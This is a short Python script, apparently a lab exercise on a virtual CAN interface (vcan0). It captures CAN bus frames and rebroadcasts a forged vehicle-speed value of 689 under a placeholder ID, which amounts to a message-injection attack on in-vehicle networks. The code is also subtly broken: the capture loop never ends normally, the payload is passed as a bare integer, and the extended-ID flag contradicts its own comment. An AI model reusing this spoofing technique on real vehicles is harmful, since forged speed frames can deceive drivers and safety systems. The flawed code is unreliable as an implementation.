import can

def main():
    received_candump = [] # list of can.Message objects
    can_interface = 'vcan0'
    bus = can.interface.Bus(channel=can_interface, bustype='socketcan')
    
    # Receive and process CAN messages
    try:
        while True:
            rcvd_msg = bus.recv()
            print("Received CAN message:", rcvd_msg)
            
            # Store messages
            if rcvd_msg is not None:
                received_candump.append(rcvd_msg)

    except can.exceptions.CanOperationError:
        print("Error occurred while reading")
            
    
    # send modified messages to update vehicle speed
    for msg in received_candump:
        if msg.arbitration_id == 123: # TODO: add id for VehicleSpeed signal, temporarily, just modifying vehicle speed
            modified_vehicle_speed = 689
            
            # send modified CAN message to update vehicle speed
            print("Sending modified message to manipulate vehicle speed...")
            modified_msg = can.Message(
                arbitration_id=msg.arbitration_id,
                data=modified_vehicle_speed,
                dlc=msg.dlc,
                is_extended_id=True  # Assuming standard CAN frames
            ) 
            
            try:
                bus.send(modified_msg)
                print(f"Message sent on {bus.channel_info}")
            
            except can.CanError:
                print("Message NOT sent")
            
            
if __name__ == "__main__":
    main()